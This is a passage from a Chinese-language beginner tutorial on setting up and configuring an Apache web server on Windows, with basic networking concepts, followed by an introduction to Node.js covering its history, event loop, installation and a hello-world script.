Web 的概念</strong>。</p></blockquote><p>构建一个专业的网站是一项巨大的工作！对于新手我们应该从小事做起，也就是说咱们不可能立马就要求自己能够开发出跟淘宝一样的电商平台，但是对咱们来说建立一个属于自己的 Blog 网站并不难（其实再大的系统也是由一些基础功能叠加出来的），所以咱们就从这个话题开始聊。</p><h4 id="如何建立一个-Blog-网站"><a href="#如何建立一个-Blog-网站" class="headerlink" title="如何建立一个 Blog 网站"></a>如何建立一个 Blog 网站</h4><blockquote><p>提问：到底什么是网站？</p><ul><li>可以在浏览器上通过一个地址直接访问使用</li><li>用于提供一种（或多种）特定服务的一系列具备相关性的网页组合的整体</li><li>例如：博客、门户、电商、在线教育等</li></ul></blockquote><p>有了明确的目标过后，我们需要规划具体的业务方案，学习特定的技能，完成各项功能，解决各种过程中出现的问题。</p><h6 id="之前学习了什么？"><a href="#之前学习了什么？" class="headerlink" title="之前学习了什么？"></a>之前学习了什么？</h6><p>在之前的学习过程中，我们很专注，没有关心这些东西在整体中是什么角色，起到什么作用。这里我们是时候总结一下我们之前学过了的内容：</p><ul><li>网页开发技术（硬性）<ul><li>HTML —— 网页内容结构（GUI）</li><li>CSS —— 网页外观样式（GUI）</li><li>JavaScript —— 编程语言，可以用于调用浏览器提供的 API</li><li>Web APIs —— 网页交互（业务功能）DOM BOM</li><li>jQuery —— 糖果而已，不是必要的</li></ul></li><li>编程能力 / 编程思想 / 解决问题的思路（软性）<ul><li>我要做什么（我要得到什么），我目前有什么（我能拿到什么）</li></ul></li></ul><p>至此，我们已经可以独立完成网页开发了，具体能完成的东西就是一个一个的网页，而且还能给这个页面加上一些动态的交互。但是这距离成为一个网站还有一些路要走。</p><pre class=" language-flow"><code class="language-flow">webpage=>operation: 网页开发website=>operation: 网站开发application=>operation: 应用开发webpage(right)->website(right)->application</code></pre><h6 id="还需要学习什么？"><a href="#还需要学习什么？" class="headerlink" title="还需要学习什么？"></a>还需要学习什么？</h6><p>想要完成完整的 Web 网站，还需要学习什么？</p><ul><li>搭建 WEB 服务器</li><li>HTTP（浏览器与服务端的通讯协议）</li><li>服务端开发（动态网页技术）</li><li>数据库操作</li><li>AJAX（浏览器与服务端的数据交互方式）</li></ul><h4 id="搭建-Web-服务器"><a href="#搭建-Web-服务器" class="headerlink" title="搭建 Web 服务器"></a>搭建 Web 服务器</h4><blockquote><ul><li>服务器（提供服务）指的就是一台<strong>安装特定的软件的公共计算机</strong>，用于专门用于提供特定的服务。<ul><li>按照服务类型的不同，又划分为：Web 服务器、数据库服务器、文件服务器等等。</li></ul></li><li>客户端（使用服务）指的是在一次服务过程中使用这个服务的设备（网络端点）。<ul><li>目前咱们最常见的客户端就是浏览器</li></ul></li></ul></blockquote><p>我们手头上的这些网页，如果想要成为一个网站，首先要完成的第一件事就是有一台公共的 Web 服务器，把这一系列的页面放到这台 Web 服务器上，让用户可以通过服务器的地址访问到这些网页。</p><p><img src="/images/web-server.png" alt="Web Server"></p><blockquote><p>提问：为什么不放在我们自己电脑上呢？</p></blockquote><p>那么，哪里有这样的服务器呢？</p><p>我们手头上的电脑都可以是一台服务器，因为服务器是一个相对的概念，只要能提供服务就可以是一个服务器（提供服务的时候就是服务端，使用服务的时候就是客户端）。</p><p>既然服务器就是安装特定的软件的计算机，那么要让自己的成为 Web 服务器就是要安装一个 Web 服务器软件。</p><h6 id="Web-服务器软件"><a href="#Web-服务器软件" class="headerlink" title="Web 服务器软件"></a>Web 服务器软件</h6><ul><li>Nginx ········································ 反向代理</li><li>Apache ····································· PHP</li><li>IIS ·············································· ASP.NET</li><li>Tomcat  ····································· Java</li></ul><h6 id="安装-Web-服务器软件"><a href="#安装-Web-服务器软件" class="headerlink" title="安装 Web 服务器软件"></a>安装 Web 服务器软件</h6><p>这里我们选择一个比较常用的 Web 服务器软件：Apache HTTP Server。</p><blockquote><p>如果使用的是安装版，与其他软件相同，安装无外乎就是一路点下一步，只是需要注意安装目录路径中不要有中文。</p></blockquote><p>由于最新的 Apache 已经不提供 Windows 的安装版本了，所以我们这里使用的是解压版。</p><blockquote><ul><li>下载地址：<a href="https://www.apachelounge.com/download/" target="_blank" rel="noopener">https://www.apachelounge.com/download/</a></li><li>使用说明：<a href="https://httpd.apache.org/docs/current/platform/windows.html" target="_blank" rel="noopener">https://httpd.apache.org/docs/current/platform/windows.html</a></li></ul></blockquote><p>安装方式如下，先解压到纯英文路径的文件夹，然后执行以下命令：</p><pre class=" language-shell"><code class="language-shell">## 注意：需要使用管理员身份运行命令行！！！## 切换到 Apache 解压路径中的 bin 目录$ cd <解压目录>/bin## 安装 Apache 服务，-n 参数是指定服务名称$ httpd.exe -k install -n "Apache"## 如果需要卸载 Apache，可以执行以下命令$ httpd.exe -k uninstall -n "Apache"</code></pre><p>执行安装命令过后会报一个错，原因是默认的配置文件有问题，需要先调整一下配置文件 <code>conf/httpd.conf</code>，才能正常启动服务。</p><p><img src="/images/1505988989079.png" alt="1505988989079"></p><p>找到 Apache 解压目录中的 conf 目录下的 httpd.conf 文件，定位到 37 行，将 <code>c:/Apache24</code> 改为解压目录，我这里解压到路径是 <code>C:/Develop/apache</code>，所以我这里修改</p><p><img src="/images/1505995465005.png" alt="1505995465005"></p><p>修改完以后，执行以下命令重新测试配置文件是否通过。</p><pre class=" language-shell"><code class="language-shell">$ httpd.exe -t</code></pre><p>这里任然报错：</p><p><img src="/images/1505995651671.png" alt="1505995651671"></p><p>通过错误信息得知，这里是因为另外一个地方配置的目录不存在导致的，所以接着调整 246 行的 <code>DocumentRoot</code> 选项：</p><p><img src="/images/1505996335305.png" alt="1505996335305"></p><p>随即，我们发现这个配置文件中有很多默认配置选项中的路径都是 <code>c:/Apache24</code>，所以我们批量都修改为我们解压的目录路径。</p><p>然后重新执行 <code>httpd.exe -t</code> 测试配置文件，这时候应该提示 <code>Syntax OK</code>。</p><blockquote><p>如果有关于 <code>ServerName</code> 的警告提示，不用管它，暂时还不会影响我们接下来的使用和操作。</p></blockquote><p>接着运行以下命令重新启动 Apache 服务：</p><pre class=" language-shell"><code class="language-shell">## 注意：需要使用管理员身份运行命令行！！！$ httpd.exe -k start -n "Apache"## 重新启动 Apache 服务$ httpd.exe -k restart -n "Apache"## 停止 Apache 服务$ httpd.exe -k stop -n "Apache"</code></pre><p>回到浏览器中，地址栏输入：<a href="http://localhost/，回车访问，这时正常应该看到" target="_blank" rel="noopener">http://localhost/，回车访问，这时正常应该看到</a> <code>It works!</code></p><p><img src="/images/1505997349857.png" alt="1505997349857"></p><h6 id="提供-Web-服务"><a href="#提供-Web-服务" class="headerlink" title="提供 Web 服务"></a>提供 Web 服务</h6><p>启动 Apache，让别人可以使用你机器上安装的 Apache 提供的 Web 服务，访问你机器上的网站。<strong>这种情况下你的机器就是服务器，别人的机器就是客户端</strong>。</p><p><strong>注意</strong>：</p><ul><li>确保配置文件语法检查通过</li><li>确保 <code>80</code> 端口没有被其他程序占用</li><li>确保防火墙允许 <code>80</code> 端口的请求，或者干脆关掉防火墙</li><li>如果出现 <strong>Forbidden</strong> 情况，确保配置文件 <code>httpd.conf</code> 中 247 行（<code>DocumentRoot</code> 之后）的 <code>Directory</code> 配置的与 <code>DocumentRoot</code> 路径相同</li><li>我们在开发阶段大多数都是自己访问自己机器上的网站，那这种情况下，我们既是服务端又是客户端。<strong>对于新手来说，最常见的问题就是分不清楚哪是客户端应该有的，哪是服务端应该有的。</strong>这种时候一定要保持清醒，客户端就是浏览器能看到的，代码以及 Apache 相关的文件和配置都是服务端的。</li></ul><h4 id="网络基础概念（必要）"><a href="#网络基础概念（必要）" class="headerlink" title="网络基础概念（必要）"></a>网络基础概念（必要）</h4><h6 id="IP-地址"><a href="#IP-地址" class="headerlink" title="IP 地址"></a>IP 地址</h6><blockquote><p>Internet Protocol Address</p></blockquote><p>设备在某一个网络中的地址，目前最常见的格式：<code>[0-255].[0-255].[0-255].[0-255]</code> 即为四个 0-255 的数字组成。</p><p>作用就是标识一个网络设备（计算机、手机、电视）在<strong>某一个具体的网络</strong>当中的地址。</p><p>127.0.0.1 是本地回环地址</p><p>######## 单个网络情况</p><p>在单个局域网下，结构非常简单，就是我们所连接的网络设备（网关）给我们分配了一个地址，在<strong>这个范围之内</strong>我们都可以通过这个地址找到我们的这个设备。</p><p><img src="/images/single-network.png" alt="单个局域网情况"></p><p>######## 多个网络情况</p><p>但是当一个设备同时处于多个网络下（比如同时连接了有线网卡和无线网卡），就会变得稍微复杂一点：</p><p><img src="/images/multiple-network.png" alt="multiple-network"></p><blockquote><p>例如：</p><p>小明这个同学同时报名了两个课程，在 A 班级小明是班长，所有 A 班级的同学都管他叫班长（叫班长就能找到他）。而在 B 班级小明是课代表，所有 B 班的同学都管他叫课代表（叫课代表就能找到他）。</p><p>同样的一个人在不同的环境有不同的身份，这些身份只有特定的环境才生效。</p></blockquote><blockquote><p>纸上得来终觉浅，绝知此事要躬行！多尝试，多思考才能更好的理解这个问题。</p></blockquote><h6 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h6><p>由于 IP 地址都是没有规律的一些数字组成的，很难被人记住，不利于传播，所以就有人想出来要给 IP 起名字（别名）。</p><blockquote><p>域名是需要花钱注册的</p></blockquote><h6 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h6><p>通过宽带运营商提供的服务器解析一个域名背后对应的 IP，这个过程叫做 <strong>DNS 寻址</strong>，帮你完成 DNS 寻址过程的服务器叫做 <strong>DNS 服务器</strong>。</p><blockquote><p><code>C:\Windows\System32\drivers\etc\hosts</code> 文件是本机的 DNS 依据</p><p><strong>注意</strong>：</p><ul><li>只能影响本机的 DNS 寻址</li><li>必须以管理员权限运行的编辑器才有权利修改 <code>hosts</code> 文件</li></ul></blockquote><h6 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h6><p>计算机本身是一个封闭的环境，就像是一个大楼，如果需要有数据通信往来，必须有门，这个门在术语中就叫端口，每一个端口都有一个编号（0-65535）</p><blockquote><p>可以通过 <code>netstat</code> 监视本机端口使用情况</p><p>占门过程叫做监听</p><p>http 默认的端口 80</p><p>https 默认的端口是 443</p></blockquote><h4 id="请求响应流程"><a href="#请求响应流程" class="headerlink" title="请求响应流程"></a>请求响应流程</h4><p><img src="/images/http-req-res.png" alt="HTTP请求和响应"></p><ol><li>用户打开浏览器</li><li>地址栏输入我们需要访问的网站网址（URL）</li><li>浏览器通过 DNS 服务器获取即将访问的网站 IP</li><li>浏览器发起一个对这个 IP 的请求</li><li>服务端接收到这个请求，进行相应的处理（如果是静态文件请求，就读取这个文件）</li><li>服务端将处理完的结果返回给客户端浏览器</li><li>浏览器将服务端返回的结果呈现到界面上</li></ol><h4 id="配置-Apache"><a href="#配置-Apache" class="headerlink" title="配置 Apache"></a>配置 Apache</h4><blockquote><p>配置文档：<a href="http://httpd.apache.org/docs/current/" target="_blank" rel="noopener">http://httpd.apache.org/docs/current/</a></p><p>配置文件中行首的 <code>##</code> 指的是注释</p></blockquote><h6 id="监听端口"><a href="#监听端口" class="headerlink" title="监听端口"></a>监听端口</h6><p><strong>监听端口</strong>可以随意修改为任意一个未被其他程序监听的端口，可以通过设置配置文件 <code>httpd.conf</code> 中的 <code>Listen</code> 指令后面的数字修改。</p><p><img src="/images/1506132097583.png" alt="1506132097583"></p><h6 id="网站根目录"><a href="#网站根目录" class="headerlink" title="网站根目录"></a>网站根目录</h6><blockquote><p><strong>网站根目录</strong>就是存放我们网站文件的最顶层目录，通常 URL 中域名后面的第一个斜线对应（映射）的就是网站根目录。</p><p><strong>注</strong>：动态网站情况会比较特殊，需要单独考虑，不一定是这个规则。</p><p>默认文档指的是我们在在访问一个目录时（没有指定其他访问哪个文件），默认返回的文件叫做默认文档</p></blockquote><p>默认 Apache 的网站根目录是安装目录中的 <code>htdocs</code> 文件夹，为了方便对网站文件的管理，一般我们会将其设置在一个自定义目录中（如果你不介意其实也无所谓）。</p><p>如果需要设置网站根目录，可以通过修改配置文件 <code>httpd.conf</code> 中的网站根目录选项切换。</p><p><img src="/images/1505998898900.png" alt="1505998898900"></p><h6 id="默认文档"><a href="#默认文档" class="headerlink" title="默认文档"></a>默认文档</h6><blockquote><p>当客户端访问的是一个目录而不是具体文件时，服务端默认返回这个目录下的某个文档（文件），这个文档就称之为<strong>默认文档</strong>。</p></blockquote><p>配置文件 <code>httpd.conf</code> 的 280 行的 <code>DirectoryIndex</code>，默认文档可以配置多个（有前到后依次去找，找到为止，如果没找到任何一个则启用目录浏览）：</p><p><img src="/images/1506132675132.png" alt="1506132675132"></p><h6 id="虚拟主机"><a href="#虚拟主机" class="headerlink" title="虚拟主机"></a>虚拟主机</h6><p>如果一台机器上只有一个网站的话，没有任何问题，但是如果想要在一台机器上部署多个站点，就必须通过配置虚拟主机的方式解决。</p><blockquote><p>由于后期对虚拟主机的配置操作非常常见，所以我们一般将虚拟主机的配置单独放到一个配置文件中，然后在主配置文件中引入，避免破坏主配置文件中的其他配置。</p><p><code>Include conf/extra/httpd-vhosts.conf</code> 配置的作用就将另外一个配置文件引入（使其生效）</p></blockquote><p>具体的操作方式就是在主配置文件 <code>httpd.conf</code> 的 505 行取消注释：</p><p><img src="/images/1505999461533.png" alt="1505999461533"></p><p>然后找到 Apache 的虚拟主机配置文件，添加一个如下的虚拟主机配置节点，然后重新启动 Apache。</p><blockquote><p>这个文件中有两个默认的示例配置，可以注释掉</p></blockquote><p><img src="/images/1506136421939.png" alt="1506136421939"></p><p>如果真的要使用 <code>baixiu.com</code> 这个域名的话，就只能通过修改 <code>hosts</code> 文件达到目的，原因很简单：这个域名不是我们自己的，我们没有办法修改这个域名在公网上的 DNS。</p><blockquote><p>注意：</p><ul><li><p>如果使用了虚拟主机，则默认必须全部使用虚拟主机，即之前的默认网站也必须通过虚拟主机方式配置，否则访问不到。参考：<a href="http://skypegnu1.blog.51cto.com/8991766/1532454" target="_blank" rel="noopener">http://skypegnu1.blog.51cto.com/8991766/1532454</a></p></li><li><p>如果虚拟主机的端口使用的不是 <code>80</code>，则需要在主配置文件中添加一个对这个端口的监听：</p><p><img src="/images/1506001971125.png" alt="1506001971125"></p></li></ul></blockquote><h4 id="静态网站与动态网站"><a href="#静态网站与动态网站" class="headerlink" title="静态网站与动态网站"></a>静态网站与动态网站</h4><p>至此，我们已经可以把这些静态页面放到服务器上了，客户端也可以通过域名请求这个网站，但是对于我们来说，Apache 能够完成的事情过于简单，无外乎就是找到你请求对应的文件 → 读取文件 → 将文件内容响应给客户端浏览器（<strong>文件原封不动的给你</strong>）。无法满足让网页内容动起来（动态变化）的需求。</p><p>于是乎，就有人提出了服务端动态网页的概念，这种实现这种概念的技术有很多种：JSP、ASP.NET、PHP、Node 等等。</p><p>这些技术的原理就是：不再将 HTML 固定写死，每次用户请求时，动态执行一段代码，临时生成一个用户想要的 HTML 页面。</p><p><img src="/images/apache-process.png" alt="apache-process"></p><p><strong>动态网站指的也就是每次请求时服务端动态生成 HTML 返回给用户的这种网站。</strong></p><p>这里我们选择 PHP 作为我们了解服务端动态网页开发的技术方案，注意：我们学习的重心不在 PHP，而是了解服务端开发，以及某些其他对前端开发有帮助的东西。</p><h4 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h4><ul><li>安装 Apache 并配置，确保本机可以访问。</li><li>同桌相互访问对方提供的 Web 服务。</li></ul><h2 id="第2章-Node-js-介绍"><a href="#第2章-Node-js-介绍" class="headerlink" title="第2章 Node.js 介绍"></a>第2章 Node.js 介绍</h2><p><strong>学习目标</strong></p><ul><li>知道 Node.js 是什么</li><li>理解 Node.js 的运行原理</li><li>了解Node.js的运行机制</li></ul><h4 id="Node-js-是什么"><a href="#Node-js-是什么" class="headerlink" title="Node.js 是什么"></a>Node.js 是什么</h4><p>以下引自 <a href="https://nodejs.org/en/" target="_blank" rel="noopener">Node.js 官网</a>：</p><blockquote><p>Node.js® is a JavaScript runtime built on <a href="https://developers.google.com/v8/" target="_blank" rel="noopener">Chrome’s V8 JavaScript engine</a>.</p></blockquote><ul><li>不是编程语言</li><li>也不是框架和库</li><li>是一个 JavaScript 运行时（环境）<ul><li>能解析和执行 JavaScript 代码（严格来说应该是 ECMAScript 代码）</li></ul></li><li>构建于 Chrome V8 JavaScript 引擎之上</li><li>为 JavaScript 提供了服务端编程的能力<ul><li>文件IO</li><li>网络IO</li></ul></li><li>从技术角度它的能力和 Java、PHP、Python、Perl、Ruby 等服务端技术类似</li></ul><h4 id="Node-的特点"><a href="#Node-的特点" class="headerlink" title="Node 的特点"></a>Node 的特点</h4><ul><li>事件驱动</li><li>非阻塞 IO（异步） 模型</li><li>单线程</li><li>跨平台</li></ul><h4 id="Node-的运行机制"><a href="#Node-的运行机制" class="headerlink" title="Node 的运行机制"></a>Node 的运行机制</h4><p>多线程处理机制：</p><p><img src="/images/multi-thread.jpg" alt="多线程处理模型"></p><p>传统的 Web 服务器（Apache、Tomcat、IIS）：</p><ul><li>请求进来</li><li>Web 服务器开启一个线程来处理用户请求</li><li>同一时间有 n 请求，服务器就需要开启 n 个线程<ul><li>一个线程最少得消耗 8MB 内存</li><li>对于一个 8GB 内存的服务器来说，它能应对的并发数是 1024 * 8 / 8 = 1024个并发</li></ul></li></ul><p>事件驱动处理模型：</p><ul><li>Node 中低层封装了一堆的异步操作 API<ul><li>文件操作</li><li>网络操作</li><li>…</li></ul></li><li>JavaScript 语言本身是单线程的</li></ul><p><img src="/images/eventloop.jpg" alt="event-loop"></p><h6 id="Event-Loop（事件循环）"><a href="#Event-Loop（事件循环）" class="headerlink" title="Event Loop（事件循环）"></a>Event Loop（事件循环）</h6><ul><li><a href="https://youtu.be/8aGhZQkoFbQ" target="_blank" rel="noopener">菲利普·罗伯茨：到底什么是Event Loop呢？</a></li><li><a href="https://nodejs.org/en/docs/guides/event-loop-timers-and-nexttick/" target="_blank" rel="noopener">The Node.js Event Loop, Timers, and <code>process.nextTick()</code></a></li><li><a href="http://www.ruanyifeng.com/blog/2014/10/event-loop.html" target="_blank" rel="noopener">阮一峰 - JavaScript 运行机制详解：再谈Event Loop</a></li></ul><h4 id="Node-发展历史"><a href="#Node-发展历史" class="headerlink" title="Node 发展历史"></a>Node 发展历史</h4><blockquote><p>以下内容节选自：<a href="https://cnodejs.org/topic/555d3d54e684c4c8088a0d78" target="_blank" rel="noopener">来自朴灵大大的 – Node.js 简史</a></p></blockquote><p>Node.js不是凭空出现的项目，也<strong>不是某个Web前端工程师为了完成将JavaScript应用到服务端的理想而在实验室里捣鼓出来的</strong>。它的出现主要归功于<strong>Ryan Dahl历时多年的研究</strong>，以及一个恰到好处的节点。2008年<strong>V8随着Chrome浏览器</strong>的出世，JavaScript 脚本语言的执行效率得到质的提升，这给Ryan Dahl带来新的启示，他原本的研究工作与V8之间碰撞出火花，于是带来了一个基于事件的高性能Web服务器。</p><p><img src="/images/ryandahl.jpg" alt="ryan-dahl"></p><p>上图为Node.js创始人Ryan Dahl。</p><p>Ryan Dahl的经历比较奇特，他并非科班出身的开发者，在2004年的时候他还在纽约的罗彻斯特大学数学系读博士，期间有研究一些分形、分类以及p-adic分析，这些都跟开源和编程没啥关系。2006年，也许是厌倦了读博的无聊，他产生了『世界那么大，我想去看看』的念头，做出了退学的决定，然后一个人来到智利的Valparaiso小镇。那时候他尚不知道找一个什么样的工作来糊口，期间他曾熬夜做了一些不切实际的研究，如如何通过云进行通信。下面是这个阶段他产出的中间产物，与后来苹果发布的iCloud似乎有那么点相似。</p><p>从那起，Ryan Dahl不知道是否因为生活的关系，他开始学习网站开发了，走上了码农的道路。那时候Ruby on Rails很火，他也不例外的学习了它。从那时候开始，Ryan Dahl的生活方式就是接项目，然后去客户的地方工作，在他眼中，拿工资和上班其实就是去那里旅行。此后他去过很多地方，如阿根廷的布宜诺斯艾利斯、德国的科隆、奥地利的维也纳。</p><p>Ryan Dahl经过两年的工作后，成为了高性能Web服务器的专家，从接开发应用到变成专门帮客户解决性能问题的专家。期间他开始写一些开源项目帮助客户解决<strong>Web服务器的高并发性能问题</strong>，尝试过的语言有Ruby、C、Lua。当然这些尝试都最终失败了，只有其中通过C写的HTTP服务库libebb项目略有起色，基本上算作libuv的前身。这些失败各有各的原因，Ruby因为虚拟机性能太烂而无法解决根本问题，C代码的性能高，但是让业务通过C进行开发显然是不太现实的事情，Lua则是已有的同步I/O导致无法发挥性能优势。虽然经历了失败，但Ryan Dahl大致的感觉到了解决问题的关键是要通过<strong>事件驱动</strong>和<strong>异步I/O</strong>来达成目的。</p><p>在他快绝望的时候，<strong>V8引擎</strong>来了。V8满足他关于高性能Web服务器的想象：</p><p><strong>没有历史包袱，没有同步I/O</strong>。不会出现一个同步I/O导致事件循环性能急剧降低的情况。<br><strong>V8性能足够好</strong>，远远比Python、Ruby等其他脚本语言的引擎快。<br><strong>JavaScript语言的闭包特性非常方便</strong>，比C中的回调函数好用。<br>于是在2009年的2月，按新的想法他提交了项目的第一行代码，这个项目的名字最终被定名为 <code>node</code>。</p><p><strong>2009年5月</strong>，Ryan Dahl正式向外界宣布他做的这个项目。2009年底，Ryan Dahl在柏林举行的JSConf EU会议上发表关于Node.js的演讲，之后Node.js逐渐流行于世。</p><p>以上就是<strong>Node.js项目的由来，是一个专注于实现高性能Web服务器优化的专家，几经探索，几经挫折后，遇到V8而诞生的项目</strong>。</p><ul><li>2009年5月，Ryan Dahl 在 github 上发布了最初的 Node 版本</li><li>2010年底，Ryan Dahl 加入 Joyent 公司全职负责 Node 的发展</li><li>2011年7月，Node 在微软的支持下发布了 Windows 版</li><li>2012年1月底，Ryan Dahl 将掌门人身份转交给了 Isaac Z.Schlueter，自己转向一些研究项目</li><li>2014年12月，多为重量级Node开发者不满 Joyent 对 Node 的管理，自立门户创建了 <code>io.js</code></li><li>2015年9月，Node 与 io.js 合并，Node 的版本从 0.12.7 直接升级到了 4.0.0</li><li>合并后的 io.js 和 Node 在 Joyent 公司的维护下并行了两个版本：<ul><li>一个是4.x.x 还是原来的 Node，这个版本是稳定版</li><li>一个是5.x.x，目前已经更新到了 6.8.1，其实就是 io.js，最新特性版，不建议生产环境使用</li></ul></li><li>Node 计划在 2016 年 10月底正式发布 Node 7.0<ul><li>7.0 已经最大限度的支持了很多的 ES6 新语法</li><li>而且提高了整体的执行性能，提供了一些别的API</li></ul></li></ul><p>Node 各个重要版本发展阶段：</p><p>1.0之前等了6年，而从1.0到8.0，只用了2年时间。</p><ul><li>从v0.1到0.12用了6年</li><li>2015-01-14发布了v1.0.0版本（io.js）</li><li>2.x（io.js）</li><li>3.x（io.js）</li><li>2015年09月Node.js基金会已发布Node.js V4.0版 与io.js合并后的第一个版本</li><li>2015年10月Node.jsv4.2.0将是首个lts长期支持版本</li><li>2016年底发布到4.2.4 &amp;&amp; 5.4.0</li><li>2016年3月20日v4.4.0 LTS（长期支持版本）和v5.9.0 Stable（稳定版本）</li><li>2016 年底 v6.0 支持95%以上的es6特性 ， v7.0通过flag支持async函数，99%的es6特性</li><li>2017年2月发布v7.6版本，可以不通过flag使用async函数</li></ul><p><img src="/images/489283f0-1b98-11e7-a4a6-57c560a3eb5c.png" alt="enter image description here"></p><h4 id="为什么要学习-Node"><a href="#为什么要学习-Node" class="headerlink" title="为什么要学习 Node"></a>为什么要学习 Node</h4><ul><li>增加职业竞争力</li><li>企业需求</li><li>进一步理解 Web</li><li>大前端必备技能</li><li>为了更好的学习前端框架</li><li>…</li></ul><h4 id="Node-能做什么"><a href="#Node-能做什么" class="headerlink" title="Node 能做什么"></a>Node 能做什么</h4><blockquote><ul><li>Node 打破了过去 JavaScript 只能在浏览器中运行的局面</li><li>前后端编程环境统一，大大降低了前后端语言切换的代价</li></ul><p><a href="https://www.zhihu.com/question/20796866" target="_blank" rel="noopener">知乎 - JavaScript能做什么，该做什么？</a><br>Atwood’s Law: any application that can be written in JavaScript, will eventually be written in JavaScript.<br>凡是能用 JavaScript 写出来的，最终都会用 JavaScript写出来。</p></blockquote><ul><li>Web 服务器</li><li>命令行工具</li><li>网络爬虫</li><li>桌面应用程序开发（Electron）</li><li>……</li></ul><h4 id="这门课程你能学到啥？"><a href="#这门课程你能学到啥？" class="headerlink" title="这门课程你能学到啥？"></a>这门课程你能学到啥？</h4><ul><li>更进一步的理解 B/S 编程模型</li><li>模块化编程</li><li>Node常用API</li><li>JavaScript 异步编程<ul><li>回调函数</li><li>Promise</li><li>Generator</li><li>async/await 函数</li></ul></li><li>Express Web 开发框架</li><li>Ecmascript 6</li><li>…</li></ul><h4 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h4><p>JavaScript 长久以来一直被限制在浏览器的沙箱中运行， 它的能力取决于浏览器中间层提供的支持多少。 Node 将高性能的 V8 带到了服务器端，使 JavaScript 也可以开发出实时高性能的服务器。 在 Node 中，不再与CSS样式表，DOM树打交道， 可以随意的访问本地文件，搭建 WebSocket 服务器，连接数据库等系统级底层操作。 Node 不处理 UI，只关心数据，无论是本地数据还是网络数据。 前后端编程统一，大大降低了前后端编程切换的代码。</p><p>对于前端工程师而言，自己熟悉的 JavaScript 如今竟然可以在另一个地方大放异彩， 不谈其他原因，仅仅因为好奇，也值得去关注和探究它。</p><h4 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h4><ul><li><a href="https://nodejs.org/en/docs/" target="_blank" rel="noopener">Node.js 官方文档</a></li><li><a href="http://nodejs.cn/" target="_blank" rel="noopener">Node.js 中文文档（非官方）</a></li><li><a href="https://read.douban.com/ebook/12053349/" target="_blank" rel="noopener">深入浅出 Node.js</a></li><li><a href="https://book.douban.com/subject/25892704/" target="_blank" rel="noopener">Node.js 权威指南</a></li><li><a href="https://book.douban.com/subject/25870705/" target="_blank" rel="noopener">Node.js 实战</a></li><li><a href="https://book.douban.com/subject/25867920/" target="_blank" rel="noopener">Node.js 实战</a></li><li><a href="https://book.douban.com/subject/26642320/" target="_blank" rel="noopener">Node.js实战（第2季）</a></li><li><a href="http://cnodejs.org/" target="_blank" rel="noopener">Node.js 中文社区</a></li><li><a href="https://github.com/alsotang/node-lessons" target="_blank" rel="noopener">Node.js 包教不包会</a></li><li><a href="http://es6.ruanyifeng.com/" target="_blank" rel="noopener">EcmaScript 6 入门</a></li><li><a href="https://github.com/nqdeng/7-days-nodejs" target="_blank" rel="noopener">七天学会 NodeJS</a></li><li>……</li></ul><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><h2 id="第3章-起步"><a href="#第3章-起步" class="headerlink" title="第3章 起步"></a>第3章 起步</h2><p>[TOC]</p><hr><h4 id="安装-Node-环境"><a href="#安装-Node-环境" class="headerlink" title="安装 Node 环境"></a>安装 Node 环境</h4><h6 id="版本说明"><a href="#版本说明" class="headerlink" title="版本说明"></a>版本说明</h6><ul><li>LTS 长期支持版，适用于开发和生产环境</li><li>Current 最新版，适用于体验测试</li></ul><h6 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h6><ul><li><a href="https://nodejs.org/en/download/" target="_blank" rel="noopener">https://nodejs.org/en/download/</a></li></ul><h6 id="安装（Windows）"><a href="#安装（Windows）" class="headerlink" title="安装（Windows）"></a>安装（Windows）</h6><p><img src="/images/image-20181120125258392-2689578.png" alt="image-20181120125258392"></p><p>点击下一步</p><p><img src="/images/image-20181120125456932-2689696.png" alt="image-20181120125456932"></p><p>同意协议，点击下一步</p><p><img src="/images/image-20181120125522493-2689722.png" alt="image-20181120125522493"></p><p>点击下一步</p><p><img src="/images/image-20181120125605674-2689765.png" alt="image-20181120125605674"></p><p>点击下一步</p><p><img src="/images/image-20181120125801058-2689881.png" alt="image-20181120125801058"></p><p>点击下一步</p><p><img src="/images/image-20181120125831374-2689911.png" alt="image-20181120125831374"></p><p>点击 Install 开始安装</p><p><img src="/images/image-20181120125856275-2689936.png" alt="image-20181120125856275"></p><p>正在安装中…</p><p><img src="/images/image-20181120125920281-2689960.png" alt="image-20181120125920281"></p><p>安装完成，点击 Finish 结束。</p><h6 id="确认是否安装成功"><a href="#确认是否安装成功" class="headerlink" title="确认是否安装成功"></a>确认是否安装成功</h6><p>打开命令行，输入 <code>node --version</code> 或者 <code>node -v</code>。如果能看到类似于下面输出 <code>v10.13.0</code> 的版本号，则表示安装成功。</p><p><img src="/images/image-20181120130926564-2690566.png" alt="image-20181120130926564"></p><blockquote><p>注意：如果是安装之前打开的命令行请在安装结束之后关闭重新打开再执行上述命令</p></blockquote><h4 id="REPL"><a href="#REPL" class="headerlink" title="REPL"></a>REPL</h4><blockquote><p>类似于浏览器中的 Console ，可以做一些基本的代码测试。</p><ul><li>R：Read 读取</li><li>E：Eval 执行</li><li>P：Print 输出</li><li>L：Loop 循环</li></ul></blockquote><ul><li>进入<ul><li>输入 <code>node</code> 回车即可</li></ul></li><li>使用</li><li>离开<ul><li>按住 <code>Ctrl</code> 不要丢，<code>c</code> 两次即可退出</li></ul></li></ul><p><img src="/images/image-20181107154211879.png" alt="image-20181107154211879"></p><hr><h4 id="执行一个JS文件"><a href="#执行一个JS文件" class="headerlink" title="执行一个JS文件"></a>执行一个JS文件</h4><p><strong>1. 新建一个 hello.js 并写入以下示例代码</strong></p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> message <span class="token operator">=</span> <span class="token string">'Hello Node.js!'</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span></code></pre><p><strong>2. 打开命令行并定位到 <code>hello.js</code> 文件所属目录</strong></p><p><strong>3. 在命令行中输入 <code>node hello.js</code> 回车执行</strong></p><blockquote><p>注意：</p><ul><li>文件名不要起名为 <code>node.js</code></li><li>文件名或者文件路径最好不要有中文</li><li>文件路径或者文件名不要出现空格</li></ul></blockquote><hr><h4 id="文件读写"><a href="#文件读写" 